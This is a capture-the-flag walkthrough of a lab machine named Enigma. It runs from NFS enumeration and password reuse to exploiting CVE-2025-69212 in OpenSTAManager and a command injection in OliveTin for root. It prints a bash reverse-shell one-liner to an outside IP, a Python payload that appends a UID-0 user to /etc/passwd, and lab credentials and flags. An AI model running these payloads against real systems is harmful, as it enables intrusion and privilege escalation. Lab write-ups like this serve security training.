<div align="center">

# 🔐 HTB: Enigma, Walkthrough by Amaira Safwen (Born as root)

**"Easy" (according to people who clearly didn't do previlege escalation part)**

 
![Status](https://img.shields.io/badge/status-pwned-success)
![Difficulty](https://img.shields.io/badge/labeled-easy-brightgreen)
![Actual_Difficulty](https://img.shields.io/badge/felt_like-medium%2Fhard-red)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Chain_Length](https://img.shields.io/badge/pivots-5-orange)

</div>

---

## ☕ A Quick Word Before We Start

Every writeup for this box that starts with "this was a quick easy box" is lying to you, or they had the module/plugin IDs handed to them in a Discord chat like a cheat code. This machine makes you trace a password across two mailboxes, guess your way through an exploit PoC that silently ignores your arguments, crack a bcrypt hash the honest way, and then reverse-engineer a JavaScript bundle just to learn that OliveTin renamed its own API and told absolutely nobody. If that's "easy" for you, congratulations, you can stop reading, go do the Insane box, and maybe stop returning my calls. For the rest of us mortals, here's what actually happened, coffee number three and all.

---

## 📋 Machine Info

| Field          | Value                                                        |
| -------------- | ------------------------------------------------------------- |
| **Target IP**  | `10.129.239.191`                                               |
| **Hostnames**  | `enigma.htb`, `mail001.enigma.htb`, `support_001.enigma.htb`   |
| **OS**         | Linux                                                          |
| **Difficulty** | "Easy" (see disclaimer above)                                  |
| **Status**     | ✅ Fully Rooted                                                |

---

## 📑 Table of Contents

* [1. Enumeration](#1-enumeration)
* [2. The Roundcube Detour That Goes (Almost) Nowhere](#2-the-roundcube-detour-that-goes-almost-nowhere)
* [3. Finding the Machine's Actual Front Door](#3-finding-the-machines-actual-front-door)
* [4. HR Strikes Again: How Kevin and Sarah Handed Me Admin](#4-hr-strikes-again-how-kevin-and-sarah-handed-me-admin)
* [5. CVE-2025-69212: the PoC That Lies About IDs](#5-cve-2025-69212-the-poc-that-lies-about-ids)
* [6. Shell as www-data](#6-shell-as-www-data)
* [7. Pivoting to haris via SQL and John](#7-pivoting-to-haris-via-sql-and-john)
* [8. User Flag](#8-user-flag)
* [9. OliveTin: Root's Favorite Trap Disguised as a Convenience Tool](#9-olivetin-roots-favorite-trap-disguised-as-a-convenience-tool)
* [10. Injecting Into a Backup Script Without Angering Bash](#10-injecting-into-a-backup-script-without-angering-bash)
* [11. Root Flag](#11-root-flag)
* [12. Full Credential Table](#12-full-credential-table)
* [13. Attack Chain Diagram](#13-attack-chain-diagram)
* [14. Lessons Learned](#14-lessons-learned)
* [15. Tools Used](#15-tools-used)

---

# 1. Enumeration

## 🔎 Port Scan

```text
22     SSH
80     HTTP
110    POP3
111    RPCBind
143    IMAP
993    IMAPS
995    POP3S
2049   NFS
```

> **📝 My Take:**

Look at that port list. Mail ports everywhere, RPCBind sitting there like a guy at a party who insists he's "in security" without elaborating, and NFS wide open at 2049. This is not a "poke port 80 and win" box. This is a "you will touch four different services before you find the real vulnerability, and you will enjoy none of it" box, and the machine wastes zero time telling you that.

`http://enigma.htb/` loaded a landing page with nothing useful on it. Classic misdirection. The real content lives on subdomains nobody announced, which means vhost fuzzing wasn't optional, it was mandatory homework.

## 🗂️ NFS: The Company's Filing Cabinet, Left Unlocked (and Also the Door)

```bash
showmount -e 10.129.239.191
```

```text
Export list for 10.129.239.191:
/srv/nfs/onboarding *
```

That wildcard `*` means anyone, anywhere, can mount this. No allowlist, no auth, nothing.

```bash
mkdir -p /mnt/onboarding
mount -t nfs 10.129.239.191:/srv/nfs/onboarding /mnt/onboarding -o nolock
ls -la /mnt/onboarding
```

```text
New_Employee_Access.pdf
```

Opened it, extracted the text, and found:

- **Kevin Mitchell**, Operations, brand new hire, probably still figuring out where the coffee machine is
- A reference to **Sarah**, over in Accounts, who I will now be mentally stalking for the rest of this writeup

> **💭 Side Thought:** Every company's onboarding PDF is basically a leaked internal directory with extra steps. HR departments are, statistically, the biggest unintentional threat actors in cybersecurity, and they don't even get a CVE number for it. Somebody should nominate them.

---

# 2. The Roundcube Detour That Goes (Almost) Nowhere

The PDF name-dropped `mail001.enigma.htb`, so naturally:

```text
10.129.239.191  enigma.htb mail001.enigma.htb support_001.enigma.htb
```

Hit up `http://mail001.enigma.htb` and got a full Roundcube webmail login. Since Kevin is the freshest employee on the payroll, and "freshest" tends to translate to "least trained, most likely to still be on a default or autogenerated password," he was the obvious first target.

Digging around the environment turned up his autogenerated onboarding password: **`Enigma2024!`**. It logged straight in.

Inside Kevin's mailbox sat a single welcome email from `sarah@enigma.htb`, nothing more. No attachments, no juicy body text, nothing that screamed "read me." A dead end on the surface, the digital equivalent of opening a treasure chest and finding a "Welcome to the team!" fruit basket voucher.

> **📝 My Take:**

Except it wasn't quite a dead end, it was a breadcrumb. If the system autogenerates onboarding passwords with the same pattern for every new hire, then Sarah, who works in the RH Departement, was worth trying with the exact same password. Sure enough, `Enigma2024!` logged straight into **Sarah's** mailbox too.

> **💭 Side Thought:** as expected RH are bad with password and security , they are good only with performance tests, and making our days the worst ( try to be kinder guys. ^_^   )
---

# 3. Finding the Machine's Actual Front Door

Time for vhost fuzzing, because the landing page clearly wasn't going to cooperate.

```bash
ffuf -u http://10.129.239.191 -H "Host: FUZZ.enigma.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 0
```

```text
support_001.enigma.htb
```

Loaded it up and found **OpenSTAManager 2.9.8**, sitting there in the version banner like it wanted to be found.

> **📝 My Take:**

OpenSTAManager 2.9.8 is not some obscure, undocumented internal tool. It falls squarely in the range affected by **CVE-2025-69212**, a P7M file-processing OS command injection sitting inside `decodeP7M()`. If you know the CVE off the top of your head, great, if not, this is where the box actually starts testing you instead of just handing you flags.

---

# 4. HR Strikes Again: How Kevin and Sarah Handed Me Admin

With access to Sarah's mailbox, I found something far more useful than Kevin's welcome email: a message referencing IT credentials for `support_001`. Since Sarah reused Kevin's exact onboarding password, it seemed fair to assume the same laziness extended one level further up the chain, and it did.

Here's the full picture, laid out in order:

1. Kevin's autogenerated password `Enigma2024!` logs into his mailbox.
2. The same password `Enigma2024!` also logs into Sarah's mailbox, because HR apparently reused the "random" generator seed, or just didn't bother rolling a new one.
3. Sarah's mailbox contains the admin credentials for the `support_001` OpenSTAManager instance.

```text
Username: admin
Password: Ne3s4rtars78s
```

```text
POST /?op=login
```

Login succeeded, redirected straight to:

```text
/controller.php?id_module=1
```

**Chain so far:**

```text
NFS → New_Employee_Access.pdf → Kevin Mitchell (Enigma2024!)
                                    └─ same password → Sarah's mailbox
                                         └─ admin creds leaked in email
                                              └─ support_001 → OpenSTAManager 2.9.8 → admin session
```

> **💭 Side Thought:** Credential reuse across "IT-side leaks" and live application logins is the unsung hero of half the boxes on this platform. Nobody rotates a password once it's written down somewhere internal, and apparently nobody in HR rotates their *own* password-generation habits either. I take back what I said earlier, HR isn't just an unintentional threat actor, they're doing unpaid red team work for us.

---

# 5. CVE-2025-69212: the PoC That Lies About IDs

Grabbed the public PoC (`CVE-2025-69212-PoC`) targeting `decodeP7M()` through the ZIP invoice import plugin.

### Attempt 1: Guessing the Module/Plugin IDs Like a Confident Idiot

```bash
python3 exploit.py \
  -t 'http://support_001.enigma.htb' \
  -u admin -p 'Ne3s4rtars78s' \
  --check --module-id 14 --plugin-id 21
```

```text
Upload failed
```

Because, of course, module and plugin IDs are instance-specific, and I just fed it numbers off the top of my head like an amateur who read the README once and decided that was plenty.

### Attempt 2: Letting the PoC Do Its Actual Job (Revolutionary Concept)

```bash
python3 exploit.py \
  -t 'http://support_001.enigma.htb' \
  -u admin -p 'Ne3s4rtars78s' \
  --check
```

```text
[+] Found 2 candidate(s).
├─ Module ID: 14
├─ Plugin ID: 21
...
[*] Switched to working module: 15/19
[+] Target is VULNERABLE!
```

**Correct IDs for Enigma:** `--module-id 15 --plugin-id 19`

> **📝 My Take:**

If you skipped `--check` and just ran the exploit blind with whatever numbers a random writeup gave you, you'd fail and probably conclude the box is broken. It isn't. It's just testing whether you actually read the PoC's usage instructions instead of copy-pasting someone else's exact command. This is the moment where "easy" boxes quietly stop being easy.

---

# 6. Shell as www-data

```bash
# Listener
nc -lvnp 4444

# Fire the RCE
python3 exploit.py \
  -t 'http://support_001.enigma.htb' \
  -u admin -p 'Ne3s4rtars78s' \
  --cmd 'bash -c "bash -i >& /dev/tcp/10.10.14.184/4444 0>&1"' \
  --module-id 15 --plugin-id 19
```

Shell caught, riding in as `www-data`.

### TTY Upgrade: Non-Negotiable, No Exceptions, Don't @ Me

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# hit Enter twice
export TERM=xterm
export SHELL=/bin/bash
stty rows 50 cols 200
```

> **💭 Side Thought:** Skip the TTY upgrade and every `su`, every `stty`, every interactive tool you try next will silently fail or hang, and you will spend ten confused minutes wondering if you broke something. You didn't. You just forgot the one ritual every Linux box demands before it lets you do anything nice.

---

# 7. Pivoting to haris via SQL and John

### Reading the App's Own Secrets

```bash
cat /var/www/html/openstamanager/config.inc.php
```

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

### Dumping the Users Table

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager \
  -e "SELECT id, username, email, password FROM zz_users;"
```

```text
1  admin  admin@enigma.htb  $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
2  haris  haris@enigma.htb  $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

`admin`'s hash matched the credential we already had, confirming reuse. `haris`'s hash was new territory, bcrypt, so out came John.

### Cracking

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt haris.hash
john --show --format=bcrypt haris.hash
```

```text
bestfriends
```

```bash
su - haris
# bestfriends
```

> **📝 My Take:**

Bcrypt cracking against rockyou is not instant, and it's not glamorous, but it's the honest way in. No shortcuts here, just patience and a wordlist that has apparently seen every password humanity has ever chosen.

---

# 8. User Flag

```bash
haris@enigma:~$ cat user.txt
```

```text
29fd4674cd6a9f9bd95fdda945e9fbcf
```

### ✅ Answer

```text
29fd4674cd6a9f9bd95fdda945e9fbcf
```

> **💭 Side Thought:** Four services touched, one HR password-reuse chain, one PoC that lied to me once, and a bcrypt crack later, and that's just the user flag. Anyone calling this box "easy" up to this point either got very lucky, already knew the answers, or is lying to sound cool on Discord.

---

# 9. OliveTin: Root's Favorite Trap Disguised as a Convenience Tool

Local port sweep as `haris`:

```bash
ss -tulnp
```

```text
LISTEN  0 4096  127.0.0.1:1337  0.0.0.0:*   users:(("OliveTin",pid=...))
```

**OliveTin**, a web UI that lets admins run predefined shell commands with a nice friendly button, running as **root**, bound to localhost. Convenience tools running as root are basically a standing invitation, like leaving a "break glass in case of emergency" hammer next to a window that's already broken.

### API Recon, or: OliveTin Forgot to Update Its Own Documentation

```text
GET  /api/GetActions   → 404 (old name, deprecated)
GET  /api/actions      → 404
POST /api/WhoAmI       → works, returns "guest"
POST /api/StartAction  → 405 on GET, accepts POST ✅
```

Sent a `StartAction` request with `actionId` in the JSON body, exactly as every guide for older OliveTin versions tells you to. Got back an empty "action with ID not found," because the proto had silently swallowed the field and moved on without complaint, like a waiter pretending they didn't hear your order.

> **📝 My Take:**

This is peak "documentation lied to me" energy. OliveTin v4+ quietly renamed its binding key, and neither the error message nor any changelog I found bothered to mention it. Had to grep the actual frontend JS bundle at `/assets/index-*.js` to dig out the real field name: **`bindingId`**. If you didn't think to read minified JavaScript on an "easy" box, this is exactly where you'd get stuck.

### Confirming the Vulnerable Binding

```bash
curl -s -X POST http://127.0.0.1:1337/api/StartAction \
  -H "Content-Type: application/json" \
  --data-binary '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"root"},{"name":"db_pass","value":"x"},{"name":"db_name","value":"production"}]}'
```

```json
{"executionTrackingId":"3393ee28-..."}
```

Log entry:

```text
exit status 2
sh: 1: cannot create /opt/backups/backup.sql: Directory nonexistent
```

The binding runs a `mysqldump` command as root, and the `db_pass` argument gets templated straight into `-p'{{ db_pass }}'`. A single leading `'` breaks out of that quote, and whatever comes after it is just... shell.

---

# 10. Injecting Into a Backup Script Without Angering Bash

### First Attempt: Betrayed by Dollar Signs Like a Fool Who Trusted Bash

```text
db_pass = x; echo hacker:$1$xyz$... >> /etc/passwd #
```

Result:

```text
hacker:./:0:0:root:/root:/bin/bash
```

Bash happily expanded `$1`, `$xyz`, and everything else with a `$` in it down to empty strings before `echo` ever ran, mangling the hash beyond recognition.

### The Fix: Base64, Because It Has No Feelings About Dollar Signs (Unlike Me 🫠)

```python
import json, base64, urllib.request

line = 'pwn:$1$xyz$BsyKyb1qET4YoYqZL2pe./:0:0:root:/root:/bin/bash'
b64  = base64.b64encode(line.encode()).decode()
inject = "x'; echo %s | base64 -d >> /etc/passwd #" % b64

payload = {
    "bindingId": "backup_database",
    "arguments": [
        {"name": "db_user", "value": "root"},
        {"name": "db_pass", "value": inject},
        {"name": "db_name", "value": "production"}
    ]
}

req = urllib.request.Request(
    "http://127.0.0.1:1337/api/StartAction",
    data=json.dumps(payload).encode(),
    headers={"Content-Type": "application/json"}
)
print(urllib.request.urlopen(req).read().decode())
```

The hash `$1$xyz$BsyKyb1qET4YoYqZL2pe./` decodes to the plaintext `12345`.

> **⚠️ Gotcha:** Earlier attempts appended the `hacker:` entry without a preceding newline, which silently glued the new user onto the end of the previous `/etc/passwd` line instead of creating a clean new one. Wrapping the payload with `printf '\n...\n'` fixed it. This is the kind of bug that makes you stare at a file for five minutes wondering why your new user doesn't exist, when the answer is one missing `\n`.

### Verify and Become Root

```bash
grep pwn /etc/passwd
```

```text
pwn:$1$xyz$BsyKyb1qET4YoYqZL2pe./:0:0:root:/root:/bin/bash
```

```bash
su - pwn
# 12345
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **📝 My Take:**

Read that command injection chain again: a mislabeled API field, a templated shell command with unsanitized quoting, a dollar-sign expansion trap, and a missing newline bug that silently corrupted the exploit on the first two tries. None of that is "easy box" territory. That's a genuine multi-step debugging exercise that happens to end in a root shell.

---

# 11. Root Flag

```bash
cat /root/root.txt
```

```text
a0730c8f3cb9001bf5f8014e265b5b5a
```

### 🚩 Answer

```text
a0730c8f3cb9001bf5f8014e265b5b5a
```

---

# 12. Full Credential Table

| Account            | Credential                                                     | Where It Came From                                              | Used For                    |
| ------------------ | ---------------------------------------------------------------| ------------------------------------------------------------------| ----------------------------- |
| `kevin.mitchell`    | `Enigma2024!` (autogenerated onboarding password)              | Found while investigating the Enigma environment                 | Kevin's Roundcube mailbox      |
| `sarah@enigma.htb`  | `Enigma2024!` (same password, reused by HR)                    | Reused Kevin's exact onboarding password                          | Sarah's mailbox, which leaked admin creds |
| `admin` (OSM)       | `Ne3s4rtars78s`                                                 | Found in Sarah's mailbox, reused at `support_001/?op=login`       | CVE-2025-69212 RCE             |
| `brollin` (MySQL)   | `Fri3nds@9099`                                                  | `config.inc.php` after RCE                                        | Dumping `zz_users`             |
| `haris`             | `bestfriends`                                                   | Cracked bcrypt hash from `zz_users`                                | `su - haris`, user flag        |
| `pwn` (UID 0)       | `12345`                                                         | Created via OliveTin command injection                            | Root                           |

---

# 13. Attack Chain Diagram

```text
Port scan
  └─ NFS /srv/nfs/onboarding
       └─ New_Employee_Access.pdf
            └─ Kevin Mitchell (Enigma2024!) → Roundcube mailbox
                 └─ same password reused → Sarah's mailbox
                      └─ admin creds leaked in email
                           └─ support_001 → OpenSTAManager 2.9.8 → admin session

Exploit chain
  └─ CVE-2025-69212 → RCE as www-data
       ├─ config.inc.php → brollin:Fri3nds@9099
       ├─ zz_users dump → haris hash → crack → "bestfriends"
       └─ su - haris → user.txt

Local enum as haris
  └─ OliveTin @ 127.0.0.1:1337 (running as root)
       └─ /api/StartAction  bindingId=backup_database  arg=db_pass
            └─ Command injection → /etc/passwd append
                 └─ su - pwn:12345 → root.txt
```

---

# 14. Lessons Learned

- **NFS exports with a wildcard `*` are an open invitation.** Onboarding PDFs are basically leaked org charts with extra formatting.
- **Autogenerated passwords are only as good as the generator's entropy.** If two employees onboarded through the same broken process end up with the exact same "random" password, it isn't random, it's a template.
- **Password reuse across accounts is the real MVP of this box.** Kevin's password unlocked Sarah's mailbox, and Sarah's mailbox unlocked admin. One weak link doesn't just compromise one account, it compromises the whole chain behind it.
- **Not every subdomain is where the app "should" be.** The main site was a decoy; `support_001` was the entire game.
- **PoC exploit IDs are almost always instance-specific.** Run `--check` before you assume the exploit is broken, or the box is broken, or *you* are broken.
- **Upgrade your shell immediately.** `pty.spawn` + `stty raw -echo; fg` is the difference between a working `su` and a mysterious "Authentication failure."
- **Convenience automation tools running as root (looking at you, OliveTin) need the same input validation as anything user-facing.** A templated shell argument is a shell injection waiting for a `'`.
- **Bash variable expansion will betray you inside injected payloads.** Base64-wrap anything containing `$`, and don't forget your newlines.
- **"Easy" is a label, not a guarantee.** This box made you trace a password across two mailboxes, reverse-engineer minified JS to find a renamed API field, and debug two separate injection failure modes before handing over root. Call it easy if you want. I'm calling it a full evening.

---

# 15. Tools Used

- `nmap`
- `showmount`, NFS client tools
- `ffuf` (vhost fuzzing)
- Roundcube webmail (manual inspection)
- `CVE-2025-69212-PoC` (OpenSTAManager P7M exploit)
- `nc` (reverse shell listener)
- `mysql` client
- `john` (bcrypt cracking, rockyou wordlist)
- `curl` (OliveTin API probing)
- Browser dev tools / manual JS bundle inspection (finding `bindingId`)
- Python 3 (`base64`, `json`, `urllib.request` for the injection payload)

---

<div align="center">

## 🔐 Enigma, Fully Rooted, Ego Only Slightly Bruised

**HTB · "Easy" (allegedly) · Linux**

**Walkthrough by Amaira Safwen (Born as root)**

</div>
